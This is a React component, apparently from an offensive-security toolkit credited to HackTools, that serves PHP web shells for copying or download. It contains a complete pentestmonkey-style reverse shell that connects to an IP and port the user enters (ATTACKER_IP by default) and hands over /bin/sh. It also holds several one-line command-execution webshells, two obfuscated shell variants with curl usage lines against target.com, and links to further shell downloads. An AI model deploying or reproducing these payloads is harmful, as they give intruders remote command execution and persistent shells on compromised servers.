import React, { useState } from 'react';
import { Copy, Check, Download, ExternalLink } from 'lucide-react';
import { Card, Button, Input } from '../ui';
import { useClipboard } from '../../hooks/useClipboard';

export default function WebShellTool() {
    const [values, setValues] = useState({ ip: '', port: '' });
    const { copied, copy } = useClipboard();
    const [copiedId, setCopiedId] = useState('');

    const handleChange = (name: string) => (e: React.ChangeEvent<HTMLInputElement>) => {
        setValues({ ...values, [name]: e.target.value });
    };

    const handleCopy = (text: string, id: string) => {
        copy(text);
        setCopiedId(id);
        setTimeout(() => setCopiedId(''), 2000);
    };

    const handleDownload = (content: string, filename: string) => {
        const element = document.createElement('a');
        const file = new Blob([content], { type: 'text/plain' });
        element.href = URL.createObjectURL(file);
        element.download = filename;
        document.body.appendChild(element);
        element.click();
        document.body.removeChild(element);
    };

    // Original HackTools payload logic
    const oneLiner = `<?php system($_GET["cmd"]);?>`;

    const shell_obfuscate = `<?=$_="";$_="'" \\;$_=($_^chr(4*4*(5+5)-40)).($_^chr(47+ord(1==1))).($_^chr(ord('_')+3)).($_^chr(((10*10)+(5*3))));$_=` + `\${$_}['_'^'o'];echo\`$_\`?>`;

    const shell_obfuscate_function = `<?php $_="{"; $_=($_^"<").($_^">;").($_^"/"); ?>` + `<?=$` + `{'_'.$_}['_']($` + `{'_'.$_}['__']);?>`;

    // PHP Reverse Shell with user inputs (original pentestmonkey logic from HackTools)
    const phpReverseShell = `<?php
set_time_limit (0);
$VERSION = "1.0";
$ip = '${values.ip || 'ATTACKER_IP'}';  
$port = ${values.port || 'ATTACKER_PORT'};
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {
  $pid = pcntl_fork();
  if ($pid == -1) {
    printit("ERROR: Can't fork");
    exit(1);
  }
  if ($pid) {
    exit(0);  // Parent exits
  }
  if (posix_setsid() == -1) {
    printit("Error: Can't setsid()");
    exit(1);
  }
  $daemon = 1;
} else {
  printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}
chdir("/");
umask(0);
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
  printit("$errstr ($errno)");
  exit(1);
}
$descriptorspec = array(
  0 => array("pipe", "r"),  
  1 => array("pipe", "w"),  
  2 => array("pipe", "w")   
);
$process = proc_open($shell, $descriptorspec, $pipes);
if (!is_resource($process)) {
  printit("ERROR: Can't spawn shell");
  exit(1);
}
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);
printit("Successfully opened reverse shell to $ip:$port");

while (1) {
  if (feof($sock)) {
    printit("ERROR: Shell connection terminated");
    break;
  }
  if (feof($pipes[1])) {
    printit("ERROR: Shell process terminated");
    break;
  }
  $read_a = array($sock, $pipes[1], $pipes[2]);
  $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
  if (in_array($sock, $read_a)) {
    if ($debug) printit("SOCK READ");
    $input = fread($sock, $chunk_size);
    if ($debug) printit("SOCK: $input");
    fwrite($pipes[0], $input);
  }
  if (in_array($pipes[1], $read_a)) {
    if ($debug) printit("STDOUT READ");
    $input = fread($pipes[1], $chunk_size);
    if ($debug) printit("STDOUT: $input");
    fwrite($sock, $input);
  }
  if (in_array($pipes[2], $read_a)) {
    if ($debug) printit("STDERR READ");
    $input = fread($pipes[2], $chunk_size);
    if ($debug) printit("STDERR: $input");
    fwrite($sock, $input);
  }
}
fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);
function printit ($string) {
  if (!$daemon) {
    print "$string\\n";
  }
} ?>`;

    const ShellSection = ({ title, shell, filename, description }: { title: string; shell: string; filename: string; description?: string }) => (
        <div className="mb-6">
            <h3 className="text-lg font-bold text-[#a2ff00] mb-2">{title}</h3>
            {description && <p className="text-sm text-gray-400 mb-3">{description}</p>}
            <div className="htb-terminal-content mb-3">
                <code className="text-xs text-blue-300 font-mono break-all">{shell}</code>
            </div>
            <div className="flex gap-3">
                <Button
                    variant="primary"
                    onClick={() => handleDownload(shell, filename)}
                    icon={<Download size={16} />}
                >
                    Download
                </Button>
                <Button
                    variant="secondary"
                    onClick={() => handleCopy(shell, filename)}
                    icon={copiedId === filename ? <Check size={16} className="text-[#a2ff00]" /> : <Copy size={16} />}
                >
                    {copiedId === filename ? 'Copied!' : 'Copy'}
                </Button>
            </div>
        </div>
    );

    return (
        <div className="animate-fade-in">
            <div className="mb-6">
                <h2 className="text-2xl font-bold text-white mb-2">PHP Web Shells</h2>
                <p className="text-gray-400 text-sm leading-relaxed">
                    Attackers who successfully exploit a remote code/command execution
                    vulnerability can use a reverse shell to obtain an interactive shell
                    session on the target machine and continue their attack.
                </p>
            </div>

            {/* PHP Reverse Shell with inputs */}
            <Card className="mb-6">
                <h3 className="text-lg font-bold text-[#a2ff00] mb-3">PHP Reverse Shell</h3>
                <p className="text-sm text-gray-400 mb-4">
                    This script will make an outbound TCP connection to a hardcoded IP and port.
                </p>

                <div className="grid grid-cols-2 gap-4 mb-4">
                    <Input
                        label="IP Address"
                        type="text"
                        value={values.ip}
                        onChange={handleChange('ip')}
                        placeholder="212.212.111.222"
                    />
                    <Input
                        label="Port"
                        type="text"
                        value={values.port}
                        onChange={handleChange('port')}
                        placeholder="1337"
                        maxLength={5}
                    />
                </div>

                <div className="htb-terminal-content mb-3">
                    <pre className="font-mono text-xs text-gray-300 whitespace-pre-wrap">{phpReverseShell}</pre>
                </div>

                <div className="flex gap-3">
                    <Button
                        variant="primary"
                        onClick={() => handleDownload(phpReverseShell, 'rev.php')}
                        icon={<Download size={16} />}
                    >
                        Download
                    </Button>
                    <Button
                        variant="secondary"
                        onClick={() => handleCopy(phpReverseShell, 'reverse-shell')}
                        icon={copiedId === 'reverse-shell' ? <Check size={16} className="text-[#a2ff00]" /> : <Copy size={16} />}
                    >
                        {copiedId === 'reverse-shell' ? 'Copied!' : 'Copy'}
                    </Button>
                    <a
                        href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php"
                        target="_blank"
                        rel="noopener noreferrer"
                        className="flex items-center gap-2 px-4 py-2 rounded bg-white/5 hover:bg-white/10 text-gray-300 text-sm font-bold transition-colors"
                    >
                        <ExternalLink size={16} />
                        Pentestmonkey Repo
                    </a>
                </div>
            </Card>

            <div className="space-y-8">
                <ShellSection
                    title="Basic RCE"
                    shell={oneLiner}
                    filename="basicRCE.php"
                    description='When you have successfully uploaded your payload, just put your commands after the variable ?cmd= (ex: ?cmd=ls -la")'
                />

                <ShellSection
                    title="Tiny OneLiner Webshell (GET)"
                    shell="<?=`$_GET[0]`?>"
                    filename="tiny_get.php"
                    description="Usage: http://target.com/path/to/shell.php?0=command"
                />

                <ShellSection
                    title="Tiny OneLiner Webshell (POST)"
                    shell="<?=`$_POST[0]`?>"
                    filename="tiny_post.php"
                    description='Usage: curl -X POST http://target.com/path/to/shell.php -d "0=command"'
                />

                <ShellSection
                    title="Tiny OneLiner Webshell (REQUEST)"
                    shell="<?=`{$_REQUEST['_']}`?>"
                    filename="tiny_request.php"
                    description="Usage: http://target.com/path/to/shell.php?_=command OR curl -X POST http://target.com/path/to/shell.php -d '_=command'"
                />

                <ShellSection
                    title="Obfuscated Shell (variant 1)"
                    shell={shell_obfuscate}
                    filename="obfuscate1.php"
                    description="Usage: http://target.com/path/to/shell.php?0=command"
                />

                <ShellSection
                    title="Obfuscated Shell (variant 2)"
                    shell={shell_obfuscate_function}
                    filename="obfuscate2.php"
                    description="Usage: http://target.com/path/to/shell.php?_=system&__=ls"
                />

                <Card>
                    <h3 className="text-lg font-bold text-[#a2ff00] mb-2">p0wny@shell</h3>
                    <p className="text-sm text-gray-400 mb-3">
                        p0wny@shell:~# is a very basic, single-file, PHP shell. It can be used
                        to quickly execute commands on a server when pentesting a PHP application.
                    </p>
                    <div className="flex gap-3">
                        <a
                            href="https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php"
                            target="_blank"
                            rel="no opener noreferrer"
                            className="flex items-center gap-2 px-4 py-2 rounded bg-[#a2ff00] hover:bg-[#8dd900] text-[#05080d] text-sm font-bold transition-colors"
                        >
                            <Download size={16} />
                            Download
                        </a>
                        <a
                            href="https://github.com/flozz/p0wny-shell"
                            target="_blank"
                            rel="noopener noreferrer"
                            className="flex items-center gap-2 px-4 py-2 rounded bg-white/5 hover:bg-white/10 text-gray-300 text-sm font-bold transition-colors"
                        >
                            <ExternalLink size={16} />
                            Flozz's Repository
                        </a>
                    </div>
                </Card>
            </div>
        </div>
    );
}
